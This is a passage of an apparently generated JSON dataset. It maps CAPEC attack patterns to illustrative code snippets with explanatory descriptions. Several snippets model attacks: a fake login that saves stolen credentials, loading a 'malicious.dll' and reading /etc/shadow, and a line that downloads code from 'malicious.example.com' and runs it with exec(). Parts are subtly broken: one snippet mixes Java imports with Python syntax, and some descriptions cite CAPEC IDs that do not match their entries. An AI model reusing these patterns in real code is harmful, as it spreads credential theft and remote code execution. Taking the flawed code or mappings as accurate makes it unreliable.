        "code_snippet": "import os\nimport shutil\nfrom PIL import ImageGrab\n\n# Directory to save screenshots\nscreenshot_dir = '/tmp/screenshots'\n\n# Ensure the directory exists\nif not os.path.exists(screenshot_dir):\n    os.makedirs(screenshot_dir)\n\n# Capture a screenshot\nscreenshot = ImageGrab.grab()\n\n# Save the screenshot to the directory\nscreenshot_path = os.path.join(screenshot_dir, 'screenshot.png')\nscreenshot.save(screenshot_path)\n\n# Simulate an adversary accessing the screenshot\nwith open(screenshot_path, 'rb') as file:\n    sensitive_data = file.read()\n\n# Print the sensitive data length (simulating exposure)\nprint(f'Length of sensitive data: {len(sensitive_data)}')\n\n# Clean up the screenshot\nshutil.rmtree(screenshot_dir)",
        "description": "This Python code snippet demonstrates the vulnerability described in the CAPEC 'Probe iOS Screenshots'. The code captures a screenshot and saves it to a temporary directory. It then simulates an adversary accessing the screenshot by reading the file and printing the length of the sensitive data. This represents the exposure of sensitive information through temporary screenshots created by the OS. The code also includes cleanup to remove the screenshot after use. The related CWEs are represented by the potential exposure of sensitive information (CWE-359, CWE-497) and the improper handling of security-relevant data (CWE-222)."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n        Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly handles intents, embodying the main idea of CAPEC-273 (Android Intent Intercept). The BroadcastReceiver listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION' and logs sensitive data received in the intent. The code does not verify the source of the intent (CWE-925) and uses an implicit intent for sensitive communication (CWE-927), making it susceptible to interception and manipulation by malicious applications. This can lead to information disclosure, denial of service, or data injection attacks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\nclass MyWebViewClient(WebViewClient):\n    def onPageFinished(self, view, url):\n        view.loadUrl(\"javascript:window.AndroidInterface.processHTML(document.getElementsByTagName('html')[0].innerHTML);\")\n\nclass MainActivity:\n    def __init__(self):\n        self.webview = WebView()\n        self.webview.getSettings().setJavaScriptEnabled(True)\n        self.webview.addJavascriptInterface(self, \"AndroidInterface\")\n        self.webview.setWebViewClient(MyWebViewClient())\n        self.webview.loadUrl(\"http://example.com\")\n\n    @JavascriptInterface\n    def processHTML(self, html):\n        # Process the HTML content\n        print(html)\n\n# Simulate the MainActivity\nmain_activity = MainActivity()",
        "description": "This Python code snippet simulates an Android application using a WebView component to load a web page. The WebView is configured to enable JavaScript and injects a JavaScript interface named 'AndroidInterface'. The 'processHTML' method is exposed to JavaScript, allowing the web page to call it and pass the HTML content of the page. This setup can be exploited by a malicious application to inject code into the WebView, manipulate the DOM, and access sensitive information. The code demonstrates CWE-749 (Exposed Dangerous Method or Function) by exposing the 'processHTML' method without proper restrictions, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the JavaScript calls, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code for security decisions."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to launch a trusted activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        // Prompt the user to enter sensitive data\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application where an implicit intent is used to launch a trusted activity. The MainActivity class sends an implicit intent to start an activity identified by the action 'com.example.TRUSTED_ACTIVITY'. However, due to the use of an implicit intent, a malicious application can intercept this intent and launch a counterfeit activity (MaliciousActivity) instead. The malicious activity mimics the trusted activity's user interface and prompts the user to enter sensitive data, exploiting the vulnerability described in CAPEC-163. This example highlights the risks associated with CWE-927 (Use of Implicit Intent for Sensitive Communication) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        // CWE-926: Improper Export of Android Application Components\n        filter.addAction(\"com.example.TRUSTED_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly verifies the source of an Intent (CWE-925) and does not restrict access to sensitive data (CWE-284). The BroadcastReceiver listens for an action 'com.example.TRUSTED_ACTION' and logs sensitive data received through the Intent. The registerReceiver method registers this receiver with an IntentFilter that listens for the specified action, but it does not restrict which applications can send this Intent, leading to potential exploitation by malicious applications. This embodies the main idea of the CAPEC 'Intent Spoof' attack, where an adversary can send a crafted Intent to a trusted application's component to achieve unauthorized actions."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"Android\");\n        webView.loadUrl(\"file:///android_asset/index.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to enable JavaScript and expose a Java object ('WebAppInterface') to JavaScript running in the WebView. The 'showToast' method in the WebAppInterface class is annotated with @JavascriptInterface, making it accessible from JavaScript. This setup can be exploited by a malicious web page loaded in the WebView to call the 'showToast' method or any other exposed methods, leading to potential security risks such as improper access control (CWE-284) and exposed dangerous methods (CWE-749)."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-506: Embedded Malicious Code\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-285: Improper Authorization\n\ndef impersonate_task():\n    # CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n    # Simulate impersonation by using elevated privileges\n    try:\n        # Attempt to load a malicious DLL (simulating embedded malicious code)\n        ctypes.windll.LoadLibrary('malicious.dll')\n        print('Malicious DLL loaded successfully.')\n    except Exception as e:\n        print(f'Failed to load malicious DLL: {e}')\n\n    # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n    # Simulate a UI layer that impersonates a legitimate task\n    user_input = input('Enter your password for the system update: ')\n    print(f'Captured sensitive information: {user_input}')\n\n    # CWE-285: Improper Authorization\n    # Simulate unauthorized access to a restricted file\n    try:\n        with open('/etc/shadow', 'r') as f:\n            sensitive_data = f.read()\n            print('Accessed restricted file content.')\n    except Exception as e:\n        print(f'Failed to access restricted file: {e}')\n\nif __name__ == '__main__':\n    impersonate_task()",
        "description": "This Python code snippet demonstrates a task impersonation attack, where a malicious application impersonates a legitimate task to steal sensitive information and leverage user privileges. The code includes several vulnerabilities: loading a malicious DLL (CWE-506), simulating elevated privileges (CWE-520), capturing user input through a fake UI (CWE-1021), and attempting unauthorized access to a restricted file (CWE-285). The main idea is to show how an adversary can exploit these weaknesses to perform a task impersonation attack."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import webbrowser\n\n# Malicious application registering a custom URL scheme\nclass MaliciousApp:\n    def __init__(self):\n        self.scheme = 'targetapp://'\n\n    def handle_url(self, url):\n        if url.startswith(self.scheme):\n            self.display_fake_login()\n\n    def display_fake_login(self):\n        # Mimic the target application's login screen\n        print('Welcome to TargetApp! Please log in.')\n        username = input('Username: ')\n        password = input('Password: ')\n        self.store_credentials(username, password)\n\n    def store_credentials(self, username, password):\n        # Store the stolen credentials\n        with open('stolen_credentials.txt', 'a') as f:\n            f.write(f'Username: {username}, Password: {password}\\n')\n\n# Simulate receiving a URL intended for the target application\nmalicious_app = MaliciousApp()\nmalicious_app.handle_url('targetapp://login')",
        "description": "This Python code snippet demonstrates a simplified version of a Scheme Squatting attack. The malicious application registers a custom URL scheme ('targetapp://') intended for a target application that is not installed. When a URL with this scheme is received, the malicious application displays a fake login screen mimicking the target application. The user is tricked into entering their credentials, which are then stored by the malicious application. This code embodies the main idea of the CAPEC by showing how an adversary can exploit custom URL schemes to intercept and steal sensitive information. The related CWEs provide additional context, such as the presence of embedded malicious code (CWE-506) and improper authorization in the handler for the custom URL scheme (CWE-939)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\n\nclass MaliciousApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.geometry('300x200')\n        self.root.title('Innocent App')\n\n        # Transparent overlay button\n        self.overlay_button = tk.Button(self.root, text='', command=self.malicious_action)\n        self.overlay_button.place(x=50, y=50, width=200, height=100)\n        self.overlay_button.lower()  # Make sure it is behind the visible button\n\n        # Visible button that user thinks they are clicking\n        self.visible_button = tk.Button(self.root, text='Click Me!', command=self.visible_action)\n        self.visible_button.place(x=50, y=50, width=200, height=100)\n\n    def visible_action(self):\n        print('Visible button clicked!')\n\n    def malicious_action(self):\n        print('Malicious action executed!')\n\nif __name__ == '__main__':\n    root = tk.Tk()\n    app = MaliciousApp(root)\n    root.mainloop()",
        "description": "This Python code snippet demonstrates a basic example of a tapjacking attack using the Tkinter library to create a GUI application. The main idea is to overlay a transparent button (malicious action) behind a visible button (innocent action). When the user clicks on the visible button, they unknowingly trigger the malicious action. This embodies the concept of tapjacking by misleading the user into interacting with a different interface than they perceive. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not properly managing the UI layers, allowing the malicious overlay to exist."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\n\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n# CWE-1263: Improper Physical Access Control\n\n# Sensitive information stored in a file without proper access control\nsensitive_data = 'SuperSecretPassword123'\nfile_path = '/tmp/sensitive_info.txt'\n\n# Writing sensitive data to a file in a world-readable location\nwith open(file_path, 'w') as file:\n    file.write(sensitive_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Displaying sensitive system information\nprint(f'Sensitive data stored at: {file_path}')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# No protection against physical side-channel attacks\n# (e.g., no encryption, no access control, no monitoring)\n\n# Simulating physical theft by copying the file to another location\nos.system(f'cp {file_path} /tmp/stolen_info.txt')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to physical theft and improper handling of sensitive information. The code stores sensitive data in a file located in a world-readable directory ('/tmp'), which lacks proper access control (CWE-921, CWE-922). It then prints the file path, exposing sensitive system information to unauthorized users (CWE-497). Additionally, the code does not implement any protection mechanisms against physical side-channel attacks (CWE-1300). Finally, it simulates physical theft by copying the sensitive file to another location, highlighting the risk of improper physical access control (CWE-1263). This example embodies the main idea of the CAPEC by showing how physical access to a system can lead to the compromise of sensitive information."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\n# Simulate a login process where sensitive information is exposed\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# Simulate a process where sensitive information is printed to the console\nprint(f'Logging in with username: {username} and password: {password}')\n\n# Simulate cleartext transmission of sensitive information\nimport socket\n\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect the socket to the port where the server is listening\nsock.connect(server_address)\n\ntry:\n    # Send data\n    message = f'username={username}&password={password}'\n    sock.sendall(message.encode('utf-8'))\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is exposed, making it vulnerable to shoulder surfing attacks. The code first prompts the user to enter their username and password. Although the password input is masked using `getpass.getpass`, the sensitive information is then printed to the console, exposing it to anyone who can see the screen (CWE-200, CWE-359). Additionally, the code simulates the transmission of this sensitive information in cleartext over a network socket (CWE-319), which can be intercepted by unauthorized actors. This example highlights the risks associated with improper handling and transmission of sensitive information, making it susceptible to shoulder surfing and other forms of unauthorized access."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\n# Simulate requesting a Kerberos ticket for a service account\nservice_account = 'service_account@domain.com'\npassword = 'weakpassword'  # CWE-521: Weak Password Requirements\n\n# Requesting a Kerberos ticket (simulated command)\ncommand = f'kinit {service_account} <<< {password}'\nsubprocess.run(command, shell=True)\n\n# Extracting the ticket and saving it to disk (simulated)\nticket_file = '/tmp/krb5cc_0'\nsubprocess.run(f'cp /tmp/krb5cc_0 {ticket_file}', shell=True)\n\n# Simulate brute-forcing the ticket (not implemented for ethical reasons)\n# This is where an attacker would attempt to crack the ticket to retrieve the password\nprint(f'Ticket saved to {ticket_file}. An attacker would now attempt to brute-force the ticket.')",
        "description": "This Python code snippet simulates the process of requesting a Kerberos ticket for a service account and saving it to disk, which is a key step in a Kerberoasting attack. The code highlights several related CWEs: it uses a weak password (CWE-521), relies on single-factor authentication (CWE-308), and uses a password system for primary authentication (CWE-309). The code also demonstrates insufficiently protected credentials (CWE-522) by saving the ticket to disk, which could be brute-forced by an attacker. The snippet does not implement the actual brute-forcing for ethical reasons but indicates where it would occur. This represents the main idea of the CAPEC by showing how an attacker could exploit Kerberos authentication to obtain and crack service account credentials."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# Malicious application leveraging a trusted user's session\nclass MaliciousApp:\n    def __init__(self, session_cookie):\n        self.session_cookie = session_cookie\n        self.target_url = 'https://saas.example.com/api/perform_action'\n\n    def perform_malicious_action(self):\n        headers = {\n            'Cookie': f'session={self.session_cookie}',\n            'Content-Type': 'application/json'\n        }\n        data = {\n            'action': 'delete_user',\n            'user_id': '12345'\n        }\n        response = requests.post(self.target_url, headers=headers, json=data)\n        if response.status_code == 200:\n            print('Malicious action performed successfully')\n        else:\n            print('Failed to perform malicious action')\n\n# Example usage\n# Assume the session_cookie is obtained through some means (e.g., XSS attack)\nsession_cookie = 'trusted_user_session_cookie'\nmalicious_app = MaliciousApp(session_cookie)\nmalicious_app.perform_malicious_action()",
        "description": "This Python code snippet demonstrates a malicious application that leverages a trusted user's session to perform unauthorized actions on a SaaS application. The `MaliciousApp` class takes a session cookie as an argument, which represents the trusted user's authenticated session. The `perform_malicious_action` method sends a POST request to the SaaS application's API endpoint, using the session cookie to authenticate the request. The request attempts to delete a user with ID '12345'. This code embodies the main idea of the CAPEC by showing how an adversary can exploit the implicit trust placed on a trusted user's session to perform malicious actions. The related CWEs are represented by the lack of proper origin validation, incorrect authorization checks, and reliance on client-side enforcement of security."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport shutil\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\ndef upload_file(file_path):\n    # Simulate file upload without validation\n    if not os.path.exists('uploads'):\n        os.makedirs('uploads')\n    shutil.copy(file_path, 'uploads/')\n    print(f'File {file_path} uploaded successfully.')\n\n# CWE-506: Malicious code embedded in the IDE environment\n# This function simulates the exfiltration of sensitive data\n# CWE-497: Exposing system information\n# CWE-200: Exposing sensitive information\n# CWE-215: Inserting sensitive information into debugging code\n\ndef exfiltrate_data():\n    sensitive_data = 'Sensitive system information: API_KEY=12345'\n    debug_info = f'Debug: {sensitive_data}'\n    print(debug_info)  # Simulate logging sensitive information\n    with open('uploads/exfiltrated_data.txt', 'w') as f:\n        f.write(sensitive_data)\n    print('Sensitive data exfiltrated.')\n\n# Simulate an attacker uploading a malicious file\nupload_file('malicious_payload.py')\n\n# Simulate exfiltration of sensitive data\nexfiltrate_data()",
        "description": "This Python code snippet demonstrates a scenario where an attacker infiltrates a software development environment by uploading a malicious file and exfiltrating sensitive data. The `upload_file` function simulates the CWE-434 vulnerability by allowing unrestricted upload of files without validation. The `exfiltrate_data` function represents CWE-506 by embedding malicious code that exfiltrates sensitive information. It also demonstrates CWE-497 and CWE-200 by exposing sensitive system information and CWE-215 by inserting sensitive information into debugging code. The code highlights the main idea of CAPEC-117, where an attacker infiltrates an IDE environment to manipulate and exfiltrate sensitive data, potentially compromising the supply chain."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import third_party_component\n\nclass Device:\n    def __init__(self):\n        # Dependency on a third-party component that may be vulnerable\n        self.component = third_party_component.Component()\n        \n    def calibrate(self):\n        # Simulate calibration process\n        if not self.component.is_trustworthy():\n            raise Exception('Calibration failed due to untrustworthy component')\n        print('Calibration successful')\n\n    def deploy(self):\n        # Simulate deployment process\n        if not self.component.is_updateable():\n            raise Exception('Deployment failed due to non-updateable component')\n        print('Deployment successful')\n\n# Simulate the substitution of a malicious component during baselining\nclass MaliciousComponent:\n    def is_trustworthy(self):\n        return False\n\n    def is_updateable(self):\n        return False\n\n# Replace the legitimate component with a malicious one\nthird_party_component.Component = MaliciousComponent\n\n# Create a device and attempt to calibrate and deploy\ndevice = Device()\ntry:\n    device.calibrate()\nexcept Exception as e:\n    print(e)\n\ntry:\n    device.deploy()\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet simulates the scenario described in the CAPEC 'Hardware Component Substitution During Baselining'. The 'Device' class depends on a third-party component for its calibration and deployment processes. The third-party component is replaced with a 'MaliciousComponent' during the baselining phase, which is not trustworthy and not updateable, embodying CWEs 1395, 1329, and 1357. The code demonstrates how the calibration and deployment processes fail due to the malicious substitution, highlighting the risks of relying on vulnerable, non-updateable, and untrustworthy components."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\n\n# CWE-1263: Improper Physical Access Control\n# Simulating access to sensitive documentation\nsensitive_docs_path = '/path/to/sensitive/docs'\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Reading sensitive documentation\ntry:\n    with open(os.path.join(sensitive_docs_path, 'tech_specs.txt'), 'r') as file:\n        tech_specs = file.read()\nexcept FileNotFoundError:\n    print('Technical specifications document not found.')\n\n# CWE-1059: Insufficient Technical Documentation\n# Simulating insufficient documentation check\nif 'critical_component' not in tech_specs:\n    print('Warning: Critical component information is missing from the documentation.')\n\n# CWE-695: Use of Low-Level Functionality\n# Simulating the use of low-level functionality that should be restricted\nrestricted_functionality = 'advanced_tech_feature'\nif restricted_functionality in tech_specs:\n    print('Warning: Use of restricted functionality detected.')\n\n# CWE-222: Truncation of Security-relevant Information\n# Simulating truncation of security-relevant information\ntruncated_info = tech_specs[:100]  # Truncate to first 100 characters\nprint('Truncated technical specifications:', truncated_info)\n\n# Simulating alteration of documentation to circumvent dial-down\naltered_docs_path = '/path/to/altered/docs'\ntry:\n    with open(os.path.join(altered_docs_path, 'tech_specs.txt'), 'w') as file:\n        # Altering the document to remove restrictions\n        altered_tech_specs = tech_specs.replace('restricted', 'unrestricted')\n        file.write(altered_tech_specs)\n    print('Documentation altered successfully.')\nexcept Exception as e:\n    print('Error altering documentation:', e)",
        "description": "This Python code snippet simulates the main idea of the CAPEC 'Documentation Alteration to Circumvent Dial-down' by demonstrating how an attacker might alter sensitive documentation to bypass restrictions on advanced technology. The code reads sensitive technical specifications, checks for insufficient documentation, detects the use of restricted functionality, and truncates security-relevant information. Finally, it alters the documentation to remove restrictions, simulating the attack described in the CAPEC. The code incorporates related CWEs to provide additional context and highlight potential vulnerabilities."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "class SystemDocumentation:\n    def __init__(self):\n        self.documentation = {}\n\n    def add_documentation(self, component, description):\n        self.documentation[component] = description\n\n    def alter_documentation(self, component, new_description):\n        if component in self.documentation:\n            self.documentation[component] = new_description\n        else:\n            raise ValueError(\"Component not found in documentation\")\n\n    def get_documentation(self, component):\n        return self.documentation.get(component, \"No documentation available\")\n\n# Example usage\nsystem_docs = SystemDocumentation()\nsystem_docs.add_documentation('ComponentA', 'Handles user authentication')\n\n# Attacker alters the documentation\nsystem_docs.alter_documentation('ComponentA', 'Handles user data storage')\n\n# System engineer retrieves the altered documentation\nprint(system_docs.get_documentation('ComponentA'))",
        "description": "This Python code snippet represents a simplified model of how an attacker could alter system documentation to introduce flaws in the system's capabilities. The `SystemDocumentation` class allows adding, altering, and retrieving documentation for system components. An attacker with access to this documentation can change the description of a component (e.g., from 'Handles user authentication' to 'Handles user data storage'), leading to potential misconfigurations or security vulnerabilities when the system is built based on this altered documentation. This embodies the CAPEC idea of 'Documentation Alteration to Produce Under-performing Systems' and highlights related CWEs such as insufficient technical documentation (CWE-1059) and exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent:\n    def __init__(self, config):\n        # Missing documentation for design\n        self.config = config\n        self.state = None\n\n    def initialize(self):\n        # Insufficient technical documentation\n        self.state = 'initialized'\n\n    def execute(self, command):\n        # Incorrect provision of specified functionality\n        if command == 'start':\n            self.state = 'running'\n        elif command == 'stop':\n            self.state = 'stopped'\n        else:\n            # Improper following of specification by caller\n            raise ValueError('Unknown command')\n\n    def dynamic_resource_access(self, resource):\n        # Improper control of dynamically-managed code resources\n        if resource == 'config':\n            return self.config\n        elif resource == 'state':\n            return self.state\n        else:\n            raise ValueError('Unknown resource')\n\n# Example usage\ncomponent = SystemComponent(config={'param': 'value'})\ncomponent.initialize()\ncomponent.execute('start')\nprint(component.dynamic_resource_access('state'))",
        "description": "This Python code snippet represents a simplified system component that suffers from several vulnerabilities related to insufficient and missing documentation, incorrect functionality, and improper control of dynamically-managed resources. The class `SystemComponent` initializes with a configuration but lacks proper documentation for its design and technical details. The `execute` method does not fully adhere to specifications, potentially leading to incorrect usage. The `dynamic_resource_access` method improperly manages access to dynamic resources, which could be exploited. This code embodies the main idea of the CAPEC by demonstrating how an attacker could exploit these weaknesses to cause errors in system design."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "class TrustedComponent:\n    def __init__(self):\n        self.data = 'Trusted Data'\n\n    def process(self):\n        return self.data\n\nclass CounterfeitComponent:\n    def __init__(self):\n        self.data = 'Malicious Data'\n\n    def process(self):\n        # Embedded malicious code\n        return self.data + ' with malicious payload'\n\nclass ProductAssembly:\n    def __init__(self, component):\n        self.component = component\n\n    def operate(self):\n        return self.component.process()\n\n# Simulating the use of a counterfeit component in product assembly\nassembly = ProductAssembly(CounterfeitComponent())\nresult = assembly.operate()\nprint(result)  # Output: Malicious Data with malicious payload",
        "description": "This Python code snippet demonstrates the concept of 'Counterfeit Hardware Component Inserted During Product Assembly' by simulating the use of a counterfeit component in a product assembly process. The `TrustedComponent` class represents a legitimate component, while the `CounterfeitComponent` class represents a malicious component with embedded malicious code. The `ProductAssembly` class uses a component to perform its operations. By instantiating `ProductAssembly` with `CounterfeitComponent`, the code simulates the introduction of a counterfeit component into the assembly process, resulting in a system designed for malicious purposes. The output shows the malicious payload, highlighting the potential security risks associated with using untrusted components."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, register_defaults=None):\n        if register_defaults is None:\n            # CWE-1221: Incorrect Register Defaults or Module Parameters\n            self.register_defaults = {'security_mode': 0, 'access_level': 0}\n        else:\n            self.register_defaults = register_defaults\n        self.lock_bit = 0  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n    def set_lock_bit(self, value):\n        self.lock_bit = value\n\n    def modify_register(self, register, value):\n        if self.lock_bit == 0:  # Lock bit should prevent modification\n            self.register_defaults[register] = value\n        else:\n            print('Modification not allowed, lock bit is set.')\n\n# CWE-1059: Insufficient Technical Documentation\n# No detailed documentation provided for the usage of this class\n\n# CWE-657: Violation of Secure Design Principles\n# The design does not follow secure principles, allowing easy modification of critical parameters\n\n# CWE-1296: Incorrect Chaining or Granularity of Debug Components\n# Debugging components are not properly chained or granular\n\n# Example usage\ncomponent = HardwareComponent()\ncomponent.set_lock_bit(1)\ncomponent.modify_register('security_mode', 1)  # Should not be allowed but is due to improper lock bit handling",
        "description": "This Python code snippet represents a simplified model of a hardware component class that embodies the main idea of the CAPEC: 'Hardware Design Specifications Are Altered'. The class has a constructor that sets default register values, which can be insecure (CWE-1221). It also includes a lock bit mechanism intended to prevent unauthorized modifications, but the implementation is flawed (CWE-1231). The code lacks sufficient technical documentation (CWE-1059) and violates secure design principles (CWE-657). Additionally, the debug components are not properly chained or granular (CWE-1296). The example usage demonstrates how the lock bit mechanism fails to prevent unauthorized register modifications, highlighting the vulnerability."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n\nclass System:\n    def __init__(self):\n        self.components = []\n\n    def add_component(self, component):\n        self.components.append(component)\n\n    def check_components(self):\n        for component in self.components:\n            if not self.is_trustworthy(component):\n                raise Exception(f'Untrustworthy component detected: {component.name}')\n\n    def is_trustworthy(self, component):\n        # Simulate a check for trustworthiness\n        return component.name != 'malicious_component'\n\n# Simulate adding a malicious hardware component\nsystem = System()\nmalicious_component = HardwareComponent('malicious_component', '1.0', updateable=False)\nsystem.add_component(malicious_component)\n\ntry:\n    system.check_components()\nexcept Exception as e:\n    print(e)\n\n# Attempt to update the malicious component\ntry:\n    malicious_component.update_firmware('2.0')\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet simulates a system that manages hardware components, highlighting vulnerabilities related to the CAPEC 'Malicious Hardware Component Replacement'. The `HardwareComponent` class represents a hardware component with attributes for name, version, and whether it is updateable. The `System` class manages these components and includes a method to check their trustworthiness. A malicious component is added to the system, demonstrating the risk of relying on untrustworthy or non-updateable components (CWE-1329, CWE-1357). The code attempts to update the malicious component's firmware, which fails due to its non-updateable nature, illustrating the potential for embedded malicious code (CWE-506) and dependency on vulnerable third-party components (CWE-1395)."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a vulnerable third-party library to download and execute malicious code\nvulnerable_url = 'http://malicious.example.com/malware.py'\n\n# CWE-506: Embedded Malicious Code\n# Downloading and executing the malicious code\nresponse = requests.get(vulnerable_url)\nexec(response.text)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# The malicious code could contain logic to replicate itself\n# CWE-1229: Creation of Emergent Resource\n# The malicious code could create new resources or files that violate security policies\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# The malicious code could inject errors to degrade system redundancy\n",
